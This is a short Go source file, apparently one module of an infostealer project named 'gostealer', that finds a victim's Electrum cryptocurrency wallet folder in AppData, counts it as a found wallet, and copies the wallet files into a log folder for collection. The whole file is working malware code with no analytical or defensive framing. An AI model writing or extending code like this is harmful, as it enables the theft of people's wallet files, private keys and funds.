package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyElectrum(logFolderPath string) {
	electrum := path.Join(os.Getenv("appdata"), "Electrum", "wallets")

	if _, err := os.Stat(electrum); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "electrum\n"
	}
	//________________

	utils.CopyFolderFiles(electrum, path.Join(logFolderPath, "wallets", "Electrum"))
}
